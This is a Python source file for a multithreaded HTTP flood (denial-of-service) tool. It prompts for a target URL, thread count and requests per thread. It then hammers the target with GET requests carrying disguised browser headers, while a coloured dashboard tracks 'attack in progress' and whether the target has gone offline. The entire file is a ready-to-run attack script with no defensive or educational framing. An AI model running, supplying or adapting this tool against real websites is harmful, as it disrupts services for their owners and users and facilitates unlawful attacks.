import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import os
import signal
from datetime import datetime
import sys

# ANSI color codes for beautiful terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Shared counter for successful and failed requests
success_count = 0
failed_count = 0
counter_lock = threading.Lock()
start_time = None
running = True

def clear_screen():
    """Clear terminal screen based on OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print a beautiful banner"""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════╗
║                                                  ║
║  {Colors.RED}█▀▄ █▀▄ █▀█ █▀▀   {Colors.GREEN}▀█▀ █▀█ █▀█ █   {Colors.BLUE}█▀▀ █▄█ █▀▄  {Colors.CYAN}║
║  {Colors.RED}█▄▀ █▄▀ █▄█ ▄█▄   {Colors.GREEN} █  █▄█ █▄█ █▄▄ {Colors.BLUE}█▄▄ █ █ █▄▀  {Colors.CYAN}║
║                                                  ║
╚══════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def format_number(num):
    """Format large numbers with commas for readability"""
    return f"{num:,}"

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global running
    print(f"\n{Colors.YELLOW}{Colors.BOLD}[!] Stopping attack gracefully... Please wait.{Colors.END}")
    running = False

def display_status(target_url):
    """Display real-time attack statistics"""
    global success_count, failed_count, start_time, running
    
    last_success = 0
    last_failed = 0
    interval = 1.0  # Update interval in seconds
    
    while running:
        current_success = success_count
        current_failed = failed_count
        elapsed = time.time() - start_time
        
        # Calculate requests per second
        success_rate = (current_success - last_success) / interval
        failed_rate = (current_failed - last_failed) / interval
        total_rate = success_rate + failed_rate
        
        # Save current counts for next calculation
        last_success = current_success
        last_failed = current_failed
        
        # Clear screen and update display
        clear_screen()
        print_banner()
        
        # Target information
        print(f"{Colors.CYAN}{Colors.BOLD}[TARGET]{Colors.END} {Colors.UNDERLINE}{target_url}{Colors.END}")
        
        # Time information
        minutes, seconds = divmod(int(elapsed), 60)
        hours, minutes = divmod(minutes, 60)
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        print(f"{Colors.CYAN}{Colors.BOLD}[ELAPSED]{Colors.END} {time_str}\n")
        
        # Request statistics
        print(f"{Colors.GREEN}{Colors.BOLD}[✓] Successful:{Colors.END} {format_number(current_success)} " +
              f"({format_number(int(success_rate))}/sec)")
        
        print(f"{Colors.RED}{Colors.BOLD}[✗] Failed:{Colors.END} {format_number(current_failed)} " +
              f"({format_number(int(failed_rate))}/sec)")
        
        print(f"{Colors.BLUE}{Colors.BOLD}[↺] Total:{Colors.END} {format_number(current_success + current_failed)} " +
              f"({format_number(int(total_rate))}/sec)")
        
        # Availability indicator
        if success_rate > 0:
            status = f"{Colors.GREEN}{Colors.BOLD}ONLINE{Colors.END}"
        else:
            status = f"{Colors.RED}{Colors.BOLD}OFFLINE OR PROTECTED{Colors.END}"
        print(f"\n{Colors.YELLOW}{Colors.BOLD}[STATUS]{Colors.END} Target appears to be {status}")
        
        # Progress animation
        chars = "⣾⣽⣻⢿⡿⣟⣯⣷"
        idx = int(elapsed) % len(chars)
        print(f"\n{Colors.CYAN}{chars[idx]}{Colors.END} Attack in progress... Press Ctrl+C to stop")
        
        # Sleep for update interval
        time.sleep(interval)

def check_site_availability(url):
    """Check if the target site is accessible"""
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True, response.elapsed.total_seconds()
        else:
            return False, response.status_code
    except requests.exceptions.RequestException as e:
        return False, str(e)

def attack(target_url, requests_per_thread, thread_id):
    """Send HTTP requests to target URL"""
    global success_count, failed_count, running
    local_success = 0
    local_failed = 0
    
    # Custom headers to look more like a real browser
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }
    
    i = 0
    while i < requests_per_thread and running:
        try:
            response = requests.get(target_url, headers=headers, timeout=2)
            if response.status_code == 200:
                local_success += 1
            else:
                local_failed += 1
        except:
            local_failed += 1
        
        i += 1
        
        # Update global counters periodically to reduce lock contention
        if i % 10 == 0:
            with counter_lock:
                global success_count, failed_count
                success_count += local_success
                failed_count += local_failed
                local_success = 0
                local_failed = 0
    
    # Update remaining counts
    if local_success > 0 or local_failed > 0:
        with counter_lock:
            global success_count, failed_count
            success_count += local_success
            failed_count += local_failed

def main():
    global start_time, running
    
    # Clear screen and show banner
    clear_screen()
    print_banner()
    
    # Get target URL from user if not provided
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = input(f"{Colors.CYAN}[?] Enter target URL (e.g., https://example.com): {Colors.END}")
    
    # Validate URL format
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    # Check if the site is accessible before starting attack
    print(f"\n{Colors.YELLOW}[*] Checking target availability...{Colors.END}")
    available, result = check_site_availability(target_url)
    
    if available:
        print(f"{Colors.GREEN}[✓] Target is accessible! Response time: {result:.3f}s{Colors.END}")
    else:
        print(f"{Colors.RED}[✗] Target appears to be offline or unreachable: {result}{Colors.END}")
        confirm = input(f"\n{Colors.YELLOW}[?] Continue anyway? (y/n): {Colors.END}").lower()
        if confirm != 'y':
            print(f"{Colors.RED}[!] Attack aborted.{Colors.END}")
            return
    
    # Get attack parameters
    try:
        thread_count = int(input(f"\n{Colors.CYAN}[?] Number of threads (recommended: 10-100): {Colors.END}") or "50")
        requests_per_thread = int(input(f"{Colors.CYAN}[?] Requests per thread (e.g., 1000): {Colors.END}") or "1000")
    except ValueError:
        print(f"{Colors.RED}[!] Invalid input. Using default values.{Colors.END}")
        thread_count = 50
        requests_per_thread = 1000
    
    # Register signal handler for graceful exit
    signal.signal(signal.SIGINT, signal_handler)
    
    # Show attack information
    print(f"\n{Colors.YELLOW}{Colors.BOLD}[*] Starting attack with:{Colors.END}")
    print(f"  {Colors.CYAN}Target:{Colors.END} {target_url}")
    print(f"  {Colors.CYAN}Threads:{Colors.END} {thread_count}")
    print(f"  {Colors.CYAN}Requests per thread:{Colors.END} {requests_per_thread}")
    print(f"  {Colors.CYAN}Total requests:{Colors.END} {format_number(thread_count * requests_per_thread)}")
    
    # Countdown timer
    print(f"\n{Colors.YELLOW}[*] Starting attack in:{Colors.END}")
    for i in range(3, 0, -1):
        print(f"{Colors.BOLD}{i}...{Colors.END}", end="\r")
        time.sleep(1)
    
    # Start time for statistics
    start_time = time.time()
    
    # Create status display thread
    status_thread = threading.Thread(target=display_status, args=(target_url,), daemon=True)
    status_thread.start()
    
    # Create and start attack threads
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=attack, args=(target_url, requests_per_thread, i))
        threads.append(t)
        t.start()
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    # Final results
    running = False
    status_thread.join(timeout=1.0)
    
    clear_screen()
    print_banner()
    
    elapsed = time.time() - start_time
    minutes, seconds = divmod(int(elapsed), 60)
    hours, minutes = divmod(minutes, 60)
    time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] Attack completed!{Colors.END}")
    print(f"{Colors.CYAN}[i] Target:{Colors.END} {target_url}")
    print(f"{Colors.CYAN}[i] Duration:{Colors.END} {time_str}")
    print(f"{Colors.CYAN}[i] Successful requests:{Colors.END} {format_number(success_count)}")
    print(f"{Colors.CYAN}[i] Failed requests:{Colors.END} {format_number(failed_count)}")
    print(f"{Colors.CYAN}[i] Total requests:{Colors.END} {format_number(success_count + failed_count)}")
    
    if success_count > 0:
        print(f"\n{Colors.GREEN}[✓] Target was accessible during the attack.{Colors.END}")
    else:
        print(f"\n{Colors.RED}[✗] Target was not accessible or completely protected.{Colors.END}")

if __name__ == "__main__":
    main()